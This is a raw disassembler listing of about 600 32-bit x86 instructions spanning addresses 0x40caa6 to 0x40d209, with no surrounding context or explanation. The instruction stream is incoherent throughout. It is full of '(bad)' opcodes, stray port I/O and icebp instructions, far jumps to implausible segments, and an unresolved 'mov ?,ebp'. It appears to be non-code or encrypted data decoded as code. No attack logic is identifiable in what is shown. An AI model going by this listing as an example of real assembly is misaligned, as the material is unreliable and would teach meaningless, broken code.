  40caa6:	push   ds
  40caa7:	fnstsw WORD PTR [ebp-0x6e2c77a5]
  40caad:	fdivr  st(4),st
  40caaf:	inc    ebx
  40cab0:	cmp    al,0x38
  40cab2:	data16 jl 0x40caaf
  40cab5:	sbb    eax,0x4b773645
  40caba:	jge    0x40ca74
  40cabc:	nop
  40cabd:	inc    esi
  40cabe:	xchg   DWORD PTR [ebx-0x729c422b],esi
  40cac4:	sub    ch,BYTE PTR [ecx-0x74b1e9b0]
  40caca:	add    cl,dh
  40cacc:	mov    WORD PTR [edx],ds
  40cace:	xchg   esp,eax
  40cacf:	xor    eax,0xa13367a8
  40cad4:	add    DWORD PTR [eax+0x307d8735],edx
  40cada:	jmp    0xd66f694d
  40cadf:	xchg   esi,eax
  40cae0:	push   0x9fd701c7
  40cae5:	ins    BYTE PTR es:[edi],dx
  40cae6:	scas   al,BYTE PTR es:[edi]
  40cae7:	fdivr  st(6),st
  40cae9:	mov    cl,0x17
  40caeb:	rol    DWORD PTR [ebx-0x4df3c5a8],0x3e
  40caf2:	and    al,0xac
  40caf4:	(bad)  
  40caf5:	in     eax,0xb0
  40caf7:	mov    ds:0xbe651383,eax
  40cafc:	xchg   ebx,eax
  40cafd:	mov    esp,0x5a7d8b9f
  40cb02:	jle    0x40cb14
  40cb04:	and    bh,cl
  40cb06:	jecxz  0x40caaa
  40cb08:	rcl    BYTE PTR [esp+ecx*2],cl
  40cb0b:	sub    eax,0x624be50d
  40cb10:	push   ecx
  40cb11:	mov    bl,BYTE PTR [ecx-0x21]
  40cb14:	cmp    DWORD PTR [edx],ebx
  40cb16:	dec    eax
  40cb17:	dec    edi
  40cb18:	(bad)  
  40cb1b:	xchg   DWORD PTR [esp+esi*1+0x13424f04],eax
  40cb22:	xor    DWORD PTR [edx+0x22],eax
  40cb25:	mov    al,al
  40cb27:	mov    ah,0xb0
  40cb29:	mov    ecx,0x77f1f164
  40cb2e:	cld    
  40cb2f:	ret    
  40cb30:	cmp    ecx,edi
  40cb32:	and    BYTE PTR [edx],0x84
  40cb35:	lea    edx,[esi-0x2d]
  40cb38:	fwait
  40cb39:	inc    ebx
  40cb3a:	dec    eax
  40cb3b:	inc    eax
  40cb3c:	jae    0x40cbad
  40cb3e:	fwait
  40cb3f:	hlt    
  40cb40:	(bad)  [edx-0x14a8fef]
  40cb46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb47:	fidivr DWORD PTR [edx]
  40cb49:	popa   
  40cb4a:	push   ss
  40cb4b:	sbb    edx,esi
  40cb4d:	sub    BYTE PTR [eax-0x38c796d7],ah
  40cb53:	nop
  40cb54:	retf   0xc73f
  40cb57:	cmc    
  40cb58:	add    bh,0x21
  40cb5b:	jg     0x40cae1
  40cb5d:	lds    esi,FWORD PTR [eax]
  40cb5f:	add    DWORD PTR [ecx],edx
  40cb61:	ret    0xc258
  40cb64:	jb     0x40cbc5
  40cb66:	fld    QWORD PTR [eax+0x4f1150e1]
  40cb6c:	addr16 xchg ebp,eax
  40cb6e:	in     al,0x12
  40cb70:	stos   BYTE PTR es:[edi],al
  40cb71:	mov    ds:0xd4123907,al
  40cb76:	(bad)  [ebx+0xa]
  40cb79:	cmp    eax,0xe45171e
  40cb7e:	and    esi,DWORD PTR [edi+0x13]
  40cb81:	leave  
  40cb82:	js     0x40cb0e
  40cb84:	pop    ebx
  40cb85:	push   edi
  40cb86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb87:	jmp    0xd7e1822
  40cb8c:	jp     0x40cbeb
  40cb8e:	dec    ebx
  40cb8f:	into   
  40cb90:	retf   
  40cb91:	stos   BYTE PTR es:[edi],al
  40cb92:	xor    ebp,esp
  40cb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb95:	(bad)  
  40cb96:	fld    DWORD PTR [eax+0x62071efd]
  40cb9c:	cmp    eax,0x44d2b064
  40cba1:	cmp    eax,0x92888e85
  40cba6:	popf   
  40cba7:	fabs   
  40cba9:	stos   DWORD PTR es:[edi],eax
  40cbaa:	and    eax,0x34f1f75d
  40cbaf:	mov    ch,0xe0
  40cbb1:	xor    DWORD PTR [ecx+0x11],0x54
  40cbb5:	push   edx
  40cbb6:	xor    BYTE PTR [eax],al
  40cbb8:	inc    ebx
  40cbb9:	fisubr WORD PTR [ecx-0x5ca73ba4]
  40cbbf:	loop   0x40cc19
  40cbc1:	mov    dh,0xca
  40cbc3:	xchg   ebp,eax
  40cbc4:	sub    DWORD PTR [ecx+0x659e5422],ebp
  40cbca:	push   eax
  40cbcb:	out    0xca,al
  40cbcd:	jge    0x40cbac
  40cbcf:	pop    ebp
  40cbd0:	addr16 std 
  40cbd2:	pushf  
  40cbd3:	mov    esi,0xe768ac0a
  40cbd8:	jle    0x40cb70
  40cbda:	xor    eax,0x1520a6c3
  40cbdf:	into   
  40cbe0:	out    0xd4,eax
  40cbe2:	ins    BYTE PTR es:[edi],dx
  40cbe3:	jmp    0x7ab5effe
  40cbe8:	pop    ecx
  40cbe9:	lods   al,BYTE PTR ds:[esi]
  40cbea:	adc    dh,bl
  40cbec:	aaa    
  40cbed:	fsubr  QWORD PTR [eiz*4+0x4b370278]
  40cbf4:	mov    edx,0xd18a51f
  40cbf9:	xor    eax,0x49ecbd0f
  40cbfe:	sub    DWORD PTR [edx+eax*2+0x77025342],ecx
  40cc05:	push   0xf1d919de
  40cc0a:	mov    edi,DWORD PTR [ebx+0x4b]
  40cc0d:	mov    bh,0xe6
  40cc0f:	fwait
  40cc10:	pop    ebx
  40cc11:	stos   BYTE PTR es:[edi],al
  40cc12:	sbb    BYTE PTR [edx-0x1d],al
  40cc15:	mov    dl,0xf
  40cc17:	ins    BYTE PTR es:[edi],dx
  40cc18:	repz das 
  40cc1a:	jno    0x40cc14
  40cc1c:	pop    ebp
  40cc1d:	xlat   BYTE PTR ds:[ebx]
  40cc1e:	icebp  
  40cc1f:	add    dh,ah
  40cc21:	sbb    DWORD PTR [esi+0x54],esi
  40cc24:	and    BYTE PTR [ecx-0x6da298a2],dl
  40cc2a:	sbb    DWORD PTR [esi],esp
  40cc2c:	leave  
  40cc2d:	fcomi  st,st(2)
  40cc2f:	(bad)  
  40cc30:	les    ebp,FWORD PTR ds:0x424e7f0b
  40cc36:	ret    
  40cc37:	pcmpeqw mm7,QWORD PTR [eax-0x76]
  40cc3b:	mov    al,0x20
  40cc3d:	outs   dx,DWORD PTR ds:[esi]
  40cc3e:	loopne 0x40cbca
  40cc40:	push   0xfffffffe
  40cc42:	fstp   QWORD PTR [edi+0x58]
  40cc45:	jno    0x40cc53
  40cc47:	jne    0x40cc5c
  40cc49:	pushf  
  40cc4a:	or     eax,0xb45237b9
  40cc4f:	adc    ah,BYTE PTR [esi-0x61]
  40cc52:	mov    ebp,0xbe56844a
  40cc57:	jo     0x40ccac
  40cc59:	idiv   DWORD PTR [edi-0x519d3817]
  40cc5f:	fdivr  DWORD PTR [edi]
  40cc61:	mov    ch,0x5f
  40cc63:	fsubp  st(1),st
  40cc65:	xor    BYTE PTR [ebx],cl
  40cc67:	jge    0x40cc16
  40cc69:	dec    edx
  40cc6a:	fnstsw WORD PTR [edx-0x3866ce3e]
  40cc70:	scas   eax,DWORD PTR es:[edi]
  40cc71:	retf   
  40cc72:	nop
  40cc73:	sbb    al,0xc5
  40cc75:	repnz cmp ah,BYTE PTR [edi]
  40cc78:	int    0x50
  40cc7a:	aad    0xe4
  40cc7c:	inc    ebx
  40cc7d:	les    bp,DWORD PTR [ecx]
  40cc80:	or     al,0x3e
  40cc82:	(bad)  
  40cc83:	cdq    
  40cc84:	test   al,0x9b
  40cc86:	test   eax,0x4160f184
  40cc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc8c:	pop    esp
  40cc8d:	dec    esi
  40cc8e:	pusha  
  40cc8f:	gs or  eax,0x53ee403c
  40cc95:	and    BYTE PTR [eax-0x46c94475],bh
  40cc9b:	mov    cl,0x8d
  40cc9d:	adc    cl,bl
  40cc9f:	sub    al,0xb6
  40cca1:	loop   0x40cc85
  40cca3:	into   
  40cca4:	dec    ebp
  40cca5:	push   0x87d9c648
  40ccaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccab:	lods   al,BYTE PTR ds:[esi]
  40ccac:	rol    ah,1
  40ccae:	pop    edx
  40ccaf:	or     BYTE PTR [ecx],0x69
  40ccb2:	shl    DWORD PTR [edi-0x11603fc3],cl
  40ccb8:	sub    edi,DWORD PTR [esi+esi*8+0x61898e3e]
  40ccbf:	pop    ecx
  40ccc0:	rcl    DWORD PTR [edi+0x4e],0x86
  40ccc4:	mov    BYTE PTR [ecx+0x26],bh
  40ccc7:	ins    BYTE PTR es:[edi],dx
  40ccc8:	sub    bh,BYTE PTR [ebx+0x20f76817]
  40ccce:	or     DWORD PTR [esi-0x51],edx
  40ccd1:	lea    esi,[edx+0x5019cdd7]
  40ccd7:	ds or  eax,0x22d24222
  40ccdd:	add    cl,BYTE PTR [edi+0x57]
  40cce0:	les    ebp,FWORD PTR [ecx]
  40cce2:	and    BYTE PTR [eax],bl
  40cce4:	repnz push edx
  40cce6:	push   ecx
  40cce7:	fdiv   st,st(2)
  40cce9:	fdiv   DWORD PTR [edi-0x521ef3d1]
  40ccef:	adc    al,ch
  40ccf1:	adc    cl,bl
  40ccf3:	gs mov ebx,0xabce0dfa
  40ccf9:	xchg   DWORD PTR [eax-0x7c67c05e],ebp
  40ccff:	and    al,0x28
  40cd01:	dec    eax
  40cd02:	cmc    
  40cd03:	xchg   esp,eax
  40cd04:	push   esi
  40cd05:	sbb    al,0xae
  40cd07:	cmp    edx,DWORD PTR [eax]
  40cd09:	outs   dx,DWORD PTR ds:[esi]
  40cd0a:	in     eax,dx
  40cd0b:	test   ch,dl
  40cd0d:	mov    dl,0x77
  40cd0f:	add    eax,0x995e95e6
  40cd14:	cmp    DWORD PTR [edx+0x6ab77316],0xffffffc8
  40cd1b:	out    dx,al
  40cd1c:	in     al,dx
  40cd1d:	fimul  WORD PTR [edx]
  40cd1f:	pushf  
  40cd20:	xor    al,0x30
  40cd22:	inc    ebx
  40cd23:	cmp    bh,BYTE PTR [edx-0x79]
  40cd26:	scas   al,BYTE PTR es:[edi]
  40cd27:	loopne 0x40ccb4
  40cd29:	pop    esi
  40cd2a:	sub    al,0xf1
  40cd2c:	sub    al,dh
  40cd2e:	jge    0x40cd6e
  40cd30:	add    ebp,esi
  40cd32:	in     eax,dx
  40cd33:	push   edx
  40cd34:	mov    dh,0x5
  40cd36:	adc    al,0x21
  40cd38:	ss jne 0x40cd76
  40cd3b:	push   cs
  40cd3c:	fadd   DWORD PTR [ebp-0x73]
  40cd3f:	sub    DWORD PTR [eax],esi
  40cd41:	xor    DWORD PTR [ebx],0x4b7d6cf5
  40cd47:	xchg   edx,eax
  40cd48:	lods   eax,DWORD PTR ds:[esi]
  40cd49:	jo     0x40ccfd
  40cd4b:	sub    DWORD PTR [eax+0x3b7bec0f],0x767b6f8d
  40cd55:	test   al,0x40
  40cd57:	dec    DWORD PTR [ecx]
  40cd59:	je     0x40cd1d
  40cd5b:	fnstcw WORD PTR [edi+0x3b]
  40cd5e:	mov    bl,dl
  40cd60:	popa   
  40cd61:	sti    
  40cd62:	popa   
  40cd63:	adc    dl,BYTE PTR [edx-0x4a]
  40cd66:	mov    bh,0xbd
  40cd68:	ret    
  40cd69:	test   BYTE PTR [edx],0xb7
  40cd6c:	scas   eax,DWORD PTR es:[edi]
  40cd6d:	fsubr  QWORD PTR [edi+ebp*2-0x2]
  40cd71:	lahf   
  40cd72:	mov    eax,ds:0x6bca381b
  40cd77:	jbe    0x40cdbd
  40cd79:	mov    ecx,0xa06e8efc
  40cd7e:	daa    
  40cd7f:	cli    
  40cd80:	pusha  
  40cd81:	sub    al,0xee
  40cd83:	or     eax,0xa6eb7911
  40cd88:	rcr    DWORD PTR ds:0x35b9cf1a,0xb7
  40cd8f:	fdivr  QWORD PTR [esi]
  40cd91:	inc    esi
  40cd92:	inc    edi
  40cd93:	push   ebp
  40cd94:	(bad)  [eax+0x33]
  40cd97:	xor    bh,al
  40cd99:	out    0x1,eax
  40cd9b:	push   0xffffff90
  40cd9d:	aaa    
  40cd9e:	(bad)  
  40cd9f:	dec    ebx
  40cda0:	gs inc ecx
  40cda2:	loop   0x40cde1
  40cda4:	push   ebp
  40cda5:	or     DWORD PTR [ecx-0x22],edi
  40cda8:	fidiv  WORD PTR [edi+0x7b]
  40cdab:	retf   0x220b
  40cdae:	mov    esi,0xa579aaaf
  40cdb3:	xchg   ah,ch
  40cdb5:	jmp    0xd57c:0x4e80f892
  40cdbc:	inc    esi
  40cdbd:	out    0x30,al
  40cdbf:	push   eax
  40cdc0:	cmp    DWORD PTR [eax+esi*1+0x7f63c53f],ebp
  40cdc7:	inc    ebx
  40cdc8:	sti    
  40cdc9:	cmc    
  40cdca:	pop    ebx
  40cdcb:	pusha  
  40cdcc:	(bad)  
  40cdcd:	cld    
  40cdce:	jl     0x40cd52
  40cdd0:	ss mov dh,0x6b
  40cdd3:	or     bh,BYTE PTR [ebp-0x43]
  40cdd6:	sti    
  40cdd7:	push   edi
  40cdd8:	lds    edi,FWORD PTR [eax+0x5d0d72d]
  40cdde:	in     eax,dx
  40cddf:	or     DWORD PTR ds:0x88099f55,0x26
  40cde6:	mov    ebp,DWORD PTR [ecx+ebx*2-0x5a]
  40cdea:	sub    eax,0x55de6e8
  40cdef:	mov    ah,0x8e
  40cdf1:	xor    BYTE PTR [eax],ah
  40cdf3:	lds    ecx,FWORD PTR [ebx-0x67b92004]
  40cdf9:	stc    
  40cdfa:	cmp    ebx,0xffffffde
  40cdfd:	sbb    BYTE PTR [edx-0x158a7244],ah
  40ce03:	in     eax,0xa9
  40ce05:	push   ebp
  40ce06:	and    al,0x7
  40ce08:	dec    ebp
  40ce09:	scas   eax,DWORD PTR es:[edi]
  40ce0a:	xadd   BYTE PTR [ebp+0x1f],dh
  40ce0e:	rol    BYTE PTR [edx+0x32e04b88],cl
  40ce14:	addr16 mov esi,gs
  40ce17:	ins    DWORD PTR es:[edi],dx
  40ce18:	mov    ds:0xaeca40e3,eax
  40ce1d:	or     eax,0x9b13fa43
  40ce22:	ja     0x40ce70
  40ce24:	or     edx,esi
  40ce26:	imul   esi,DWORD PTR [eax+eax*2+0x69],0x239429a1
  40ce2e:	fld    TBYTE PTR [ecx]
  40ce30:	add    eax,0x101cd734
  40ce35:	rol    edi,cl
  40ce37:	jb     0x40ce93
  40ce39:	xchg   edx,eax
  40ce3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce3b:	dec    ebp
  40ce3c:	in     eax,0xf1
  40ce3e:	in     eax,dx
  40ce3f:	cwde   
  40ce40:	sbb    ah,bh
  40ce42:	scas   al,BYTE PTR es:[edi]
  40ce43:	jo     0x40ce75
  40ce45:	aam    0x25
  40ce47:	jno    0x40cde6
  40ce49:	cmp    ah,0xca
  40ce4c:	mul    DWORD PTR [edi+0x3a4d3bc2]
  40ce52:	adc    cl,al
  40ce54:	sub    edi,DWORD PTR [ebp+ebx*8-0x3a]
  40ce58:	xor    ecx,DWORD PTR [ebp+0x34]
  40ce5b:	stc    
  40ce5c:	repnz mov al,ds:0xafd3d50e
  40ce62:	fwait
  40ce63:	nop
  40ce64:	popa   
  40ce65:	push   ecx
  40ce66:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ce68:	xor    BYTE PTR [eax],bl
  40ce6a:	lods   al,BYTE PTR ds:[esi]
  40ce6b:	adc    DWORD PTR [esi+0x5ea9cdec],ebx
  40ce71:	inc    ebp
  40ce72:	push   eax
  40ce73:	ss mov ch,0x70
  40ce76:	call   0xcfe7a143
  40ce7b:	mov    al,ds:0xd16a4612
  40ce80:	rcl    DWORD PTR [eax+0x41],cl
  40ce83:	nop
  40ce84:	fwait
  40ce85:	adc    ebp,DWORD PTR [esi-0x229bc35e]
  40ce8b:	in     al,dx
  40ce8c:	push   cs
  40ce8d:	les    edx,FWORD PTR [eax+0x37c15ea3]
  40ce93:	pop    esp
  40ce94:	push   ss
  40ce95:	push   edx
  40ce96:	dec    edx
  40ce97:	jecxz  0x40ceb5
  40ce99:	add    DWORD PTR gs:[edi-0x31],edi
  40ce9d:	popa   
  40ce9e:	les    ecx,FWORD PTR [edx]
  40cea0:	call   0x77916ffc
  40cea5:	(bad)
  40cea8:	cmp    al,0x8
  40ceaa:	adc    al,0xd6
  40ceac:	inc    ebx
  40cead:	mov    ebx,0x9b4b850e
  40ceb2:	push   ebx
  40ceb3:	xor    eax,0xa625e7ea
  40ceb8:	mov    ds:0xbb9d672b,eax
  40cebd:	mov    BYTE PTR [ebp-0x11a920a8],ch
  40cec3:	mov    ebp,0x2bd79053
  40cec8:	cmp    al,0x4a
  40ceca:	nop
  40cecb:	imul   ebx,DWORD PTR [ebx],0xffffff9b
  40cece:	sti    
  40cecf:	aas    
  40ced0:	ret    0xec81
  40ced3:	mov    ds:0xb7a0d332,al
  40ced8:	adc    bh,BYTE PTR [esi]
  40ceda:	out    0x4b,al
  40cedc:	add    eax,0x1deb10cd
  40cee1:	jle    0x40ce98
  40cee3:	push   ss
  40cee4:	sbb    bl,BYTE PTR [ecx-0x1e]
  40cee7:	adc    eax,0x4e9753c7
  40ceec:	arpl   WORD PTR [ecx-0x6a],ax
  40ceef:	(bad)  
  40cef0:	fst    st(6)
  40cef2:	sub    ebp,DWORD PTR [esi-0x11f5678a]
  40cef8:	pop    ss
  40cef9:	pop    ebp
  40cefa:	jo     0x40cf1a
  40cefc:	imul   eax,edx,0xe84c3877
  40cf02:	mov    eax,ds:0x1e2a5584
  40cf07:	cmc    
  40cf08:	push   esi
  40cf09:	mov    eax,0x2239720d
  40cf0e:	pop    ecx
  40cf0f:	mov    DWORD PTR [ebx-0x1ebd540a],eax
  40cf15:	mov    al,ds:0x190d2976
  40cf1a:	pop    edx
  40cf1b:	mov    eax,0x68e17da5
  40cf20:	test   DWORD PTR [ebx+0x10],edi
  40cf23:	cmp    ch,ah
  40cf25:	(bad)  
  40cf26:	iret   
  40cf27:	push   cs
  40cf28:	(bad)  
  40cf29:	jne    0x40cf7b
  40cf2b:	inc    ebx
  40cf2c:	call   0x2ed1de24
  40cf31:	jecxz  0x40cf6d
  40cf33:	add    DWORD PTR [edx+0x68c6e9f8],ebp
  40cf39:	adc    eax,0x7865f2e1
  40cf3e:	cs jecxz 0x40cefb
  40cf41:	lods   eax,DWORD PTR ds:[esi]
  40cf42:	or     al,0xe7
  40cf44:	add    eax,0x7d8e4f18
  40cf49:	loop   0x40cf02
  40cf4b:	or     eax,0x63a473ed
  40cf50:	test   al,0xff
  40cf52:	lds    edi,FWORD PTR [edi+0x2b2fe131]
  40cf58:	jecxz  0x40cf3d
  40cf5a:	xchg   edx,eax
  40cf5b:	aas    
  40cf5c:	add    edi,DWORD PTR [edx]
  40cf5e:	push   ds
  40cf5f:	mov    esi,0x9cda4993
  40cf64:	scas   al,BYTE PTR es:[edi]
  40cf65:	jo     0x40cf0d
  40cf67:	pop    esi
  40cf68:	lods   al,BYTE PTR ds:[esi]
  40cf69:	mov    ch,0x85
  40cf6b:	aam    0x71
  40cf6d:	fnop   
  40cf6f:	ins    DWORD PTR es:[edi],dx
  40cf70:	mov    ds:0x44352263,al
  40cf75:	lea    eax,[edx+0x61e68196]
  40cf7b:	out    0xdf,al
  40cf7d:	dec    esi
  40cf7e:	dec    edx
  40cf7f:	ficom  DWORD PTR [eax+esi*2-0x691d1eb5]
  40cf86:	pop    esp
  40cf87:	or     ebp,DWORD PTR [ebx]
  40cf89:	ds xor eax,edi
  40cf8c:	pop    es
  40cf8d:	lock push eax
  40cf8f:	cdq    
  40cf90:	sti    
  40cf91:	xor    al,0x85
  40cf93:	add    ah,dh
  40cf95:	addr16 dec esi
  40cf97:	cmp    DWORD PTR [eax],0x23afe7dd
  40cf9d:	xor    al,0xcb
  40cf9f:	clc    
  40cfa0:	add    cl,dl
  40cfa2:	jmp    0x2ff1:0x20976319
  40cfa9:	push   esi
  40cfaa:	mov    edx,0xab8008c7
  40cfaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfb0:	mov    al,0xe8
  40cfb2:	cmp    ax,0x9cca
  40cfb6:	mov    ds:0x126696de,al
  40cfbb:	dec    ecx
  40cfbc:	fist   DWORD PTR [edx]
  40cfbe:	cmp    ah,BYTE PTR [ecx-0x3974ffb]
  40cfc4:	shl    ah,cl
  40cfc6:	icebp  
  40cfc7:	adc    BYTE PTR es:[edi+0x15],dl
  40cfcb:	add    al,dl
  40cfcd:	cs adc ch,dl
  40cfd0:	ret    0xd97a
  40cfd3:	daa    
  40cfd4:	or     BYTE PTR [ebp-0x18],0x37
  40cfd8:	inc    ebp
  40cfd9:	push   cs
  40cfda:	jns    0x40cf8c
  40cfdc:	fisttp WORD PTR [esi+0x5a]
  40cfdf:	or     DWORD PTR ds:0x36209a0b,esp
  40cfe5:	adc    BYTE PTR [ecx+0x79],dh
  40cfe8:	retf   0xe246
  40cfeb:	jbe    0x40cff5
  40cfed:	mov    fs,WORD PTR [eax+0x1f]
  40cff0:	mov    ?,ebp
  40cff2:	adc    cl,bh
  40cff4:	mov    cl,0x56
  40cff6:	jle    0x40cf79
  40cff8:	mov    bh,0x80
  40cffa:	sub    eax,0x34064782
  40cfff:	sbb    DWORD PTR [eax],0xffffffda
  40d002:	lods   al,BYTE PTR ds:[esi]
  40d003:	xchg   ebp,eax
  40d004:	pop    ebp
  40d005:	test   eax,0x55684383
  40d00a:	inc    edx
  40d00b:	dec    ecx
  40d00c:	jg     0x40cfe3
  40d00e:	xor    DWORD PTR [ebx-0x77],esi
  40d011:	sbb    esp,DWORD PTR [ebp+0x34]
  40d014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d015:	sbb    dl,ch
  40d017:	stos   DWORD PTR es:[edi],eax
  40d018:	leave  
  40d019:	pop    ebx
  40d01a:	out    dx,al
  40d01b:	test   eax,0x8aecbce5
  40d020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d021:	push   ebp
  40d022:	pop    esp
  40d023:	or     DWORD PTR [eax-0x56],esp
  40d026:	int3   
  40d027:	inc    esp
  40d028:	xor    al,0xf6
  40d02a:	cmp    DWORD PTR [ecx],esi
  40d02c:	repnz (bad) 
  40d02f:	into   
  40d030:	les    eax,FWORD PTR [esi-0x12]
  40d033:	(bad)  
  40d034:	shl    cl,0xc6
  40d037:	jbe    0x40d08d
  40d039:	inc    eax
  40d03a:	retf   
  40d03b:	xor    ah,BYTE PTR [ecx]
  40d03d:	stos   DWORD PTR es:[edi],eax
  40d03e:	xchg   DWORD PTR [ebp-0x393e2f3],eax
  40d044:	cmp    BYTE PTR [edi-0x57],al
  40d047:	push   ecx
  40d048:	inc    esp
  40d049:	mov    eax,0x9648371c
  40d04e:	test   eax,0x51303d0
  40d053:	stos   BYTE PTR es:[edi],al
  40d054:	mov    al,dh
  40d056:	dec    edx
  40d057:	jl     0x40cffd
  40d059:	aad    0x6c
  40d05b:	pop    edi
  40d05c:	mov    al,0xfa
  40d05e:	mov    al,ds:0xc9ad41bd
  40d063:	add    al,BYTE PTR [ecx]
  40d065:	sbb    DWORD PTR [edi+0x2d515820],edi
  40d06b:	push   0xffffffcc
  40d06d:	mov    ss,WORD PTR [esi]
  40d06f:	jmp    0x40cff6
  40d071:	inc    edx
  40d072:	mov    bl,0x48
  40d074:	ja     0x40d043
  40d076:	sub    DWORD PTR [ebp-0x6d],eax
  40d079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d07a:	fiadd  DWORD PTR [edi+0x6450a9e7]
  40d080:	lds    esi,FWORD PTR [edi-0x24]
  40d083:	adc    al,0x9
  40d085:	and    eax,0xb9a17c51
  40d08a:	mov    dl,0xf6
  40d08c:	fwait
  40d08d:	inc    esi
  40d08e:	fnstcw WORD PTR [eax-0x56]
  40d091:	mov    ds:0x425dd0b4,eax
  40d096:	mov    ecx,0x276011b2
  40d09b:	icebp  
  40d09c:	(bad)  
  40d09d:	imul   esi,DWORD PTR [ebx],0xffffff91
  40d0a0:	inc    bl
  40d0a2:	jmp    0x1802:0x1422dd6b
  40d0a9:	mov    ebx,0x21d9e9f4
  40d0ae:	iret   
  40d0af:	icebp  
  40d0b0:	stos   BYTE PTR es:[edi],al
  40d0b1:	jno    0x40d12d
  40d0b3:	add    al,0xad
  40d0b5:	cdq    
  40d0b6:	jmp    0xa87ec8a5
  40d0bb:	retf   0x10cb
  40d0be:	jbe    0x40d134
  40d0c0:	test   BYTE PTR [edx+0x7e],0x46
  40d0c4:	xor    BYTE PTR [ecx-0x51],dh
  40d0c7:	cwde   
  40d0c8:	mov    ch,0xa7
  40d0ca:	and    eax,0x3eac8fa
  40d0cf:	mov    ds:0x41dc2d72,al
  40d0d4:	(bad)  
  40d0d5:	fld    TBYTE PTR [ecx+0x46]
  40d0d8:	lock add al,0xde
  40d0db:	xor    DWORD PTR ds:[eax+0x1956b4bf],0x875868fd
  40d0e6:	or     al,0xb2
  40d0e8:	fsub   DWORD PTR [ebx]
  40d0ea:	(bad)  
  40d0ec:	div    BYTE PTR [ebp+0x8]
  40d0ef:	out    0x27,eax
  40d0f1:	xchg   ebx,eax
  40d0f2:	lahf   
  40d0f3:	js     0x40d0ec
  40d0f5:	int3   
  40d0f6:	dec    ecx
  40d0f7:	adc    eax,0xa486887f
  40d0fc:	ret    0x681c
  40d0ff:	xor    eax,0x327b917c
  40d104:	je     0x40d155
  40d106:	cmp    DWORD PTR [ecx-0x15],ebx
  40d109:	pop    ebx
  40d10a:	or     ah,BYTE PTR [edx+0xb]
  40d10d:	test   ch,dl
  40d10f:	add    cl,BYTE PTR [ebp+0x41a33fae]
  40d115:	push   es
  40d116:	cli    
  40d117:	(bad)  
  40d118:	mov    BYTE PTR [ecx],bh
  40d11a:	dec    edi
  40d11b:	or     ebp,esi
  40d11d:	jne    0x40d19c
  40d11f:	popa   
  40d120:	int    0xd9
  40d122:	pusha  
  40d123:	cmp    edi,DWORD PTR [ebx-0x6f]
  40d126:	adc    DWORD PTR [eax+0x7f27993d],ecx
  40d12c:	mov    ?,ebp
  40d12e:	(bad)  
  40d12f:	pop    ebp
  40d130:	cmp    al,0x92
  40d132:	or     BYTE PTR [edx+0x37],dl
  40d135:	sub    bl,bl
  40d137:	mov    ecx,0xb3edb894
  40d13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d13d:	xor    DWORD PTR [ebx-0x78a80441],esi
  40d143:	push   es
  40d144:	xor    al,0x8d
  40d146:	jmp    0xb05b:0x40e1732
  40d14d:	cmp    al,0xae
  40d14f:	iret   
  40d150:	(bad)  
  40d151:	enter  0x985c,0x1d
  40d155:	dec    bh
  40d157:	loop   0x40d1cc
  40d159:	test   edi,esp
  40d15b:	rcr    BYTE PTR [edi-0x3a],1
  40d15e:	nop
  40d15f:	cs pusha 
  40d161:	adc    DWORD PTR [edi-0x7c4e9cdb],esp
  40d167:	fs dec ebx
  40d169:	mov    cl,0xdf
  40d16b:	adc    DWORD PTR [ebp+0x1b],0x5db62352
  40d172:	and    dh,BYTE PTR [edx-0x5e]
  40d175:	daa    
  40d176:	xchg   esp,eax
  40d177:	(bad)  
  40d178:	into   
  40d179:	ins    DWORD PTR es:[edi],dx
  40d17a:	mov    ecx,0xa72c6e73
  40d17f:	(bad)  
  40d180:	std    
  40d181:	xlat   BYTE PTR ds:[ebx]
  40d182:	sbb    dh,bh
  40d184:	je     0x40d162
  40d186:	fldcw  WORD PTR [edi+0x28]
  40d189:	sub    al,0xdb
  40d18b:	and    al,0xde
  40d18d:	dec    esp
  40d18e:	cmp    dh,BYTE PTR [edx+0x467adbaf]
  40d194:	stc    
  40d195:	push   esp
  40d196:	adc    esi,DWORD PTR [ecx+0x3]
  40d199:	es xchg edi,eax
  40d19b:	(bad)  
  40d19d:	xchg   esi,eax
  40d19e:	stos   DWORD PTR es:[edi],eax
  40d19f:	mov    bh,0x44
  40d1a1:	push   ebx
  40d1a2:	mov    bl,0x57
  40d1a4:	and    ebp,ebp
  40d1a6:	popf   
  40d1a7:	inc    ebx
  40d1a8:	sub    DWORD PTR [ebx+0x16db7ce],esi
  40d1ae:	call   0x5f82:0xd35dc68c
  40d1b5:	and    dh,BYTE PTR [eax+0xf764f9]
  40d1bb:	jmp    0xe71817ba
  40d1c0:	mov    ds:0x4890ce5c,eax
  40d1c5:	imul   eax,ecx,0x322cb0c1
  40d1cb:	xor    DWORD PTR [ecx+0x6a],0x463bc351
  40d1d2:	sub    eax,0x39e246f5
  40d1d7:	pop    edi
  40d1d8:	jmp    DWORD PTR [edi]
  40d1da:	cmp    ecx,eax
  40d1dc:	clc    
  40d1dd:	inc    esp
  40d1de:	sub    al,0x7
  40d1e0:	or     al,BYTE PTR [esi+0x647c5aec]
  40d1e6:	mov    bl,BYTE PTR [ebx+0x3d]
  40d1e9:	push   0xffffffc0
  40d1eb:	cmp    ch,dh
  40d1ed:	xchg   DWORD PTR [ebp+ecx*2-0x77820a12],ecx
  40d1f4:	lahf   
  40d1f5:	cmp    eax,edi
  40d1f7:	(bad)  
  40d1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1f9:	lods   al,BYTE PTR ds:[esi]
  40d1fa:	mov    ah,0x31
  40d1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1fd:	ret    0xed48
  40d200:	cmp    al,0x38
  40d202:	pop    eax
  40d203:	mul    DWORD PTR [esi]
  40d205:	sti    
  40d206:	and    BYTE PTR [ecx+edi*8],al
  40d209:	popa   
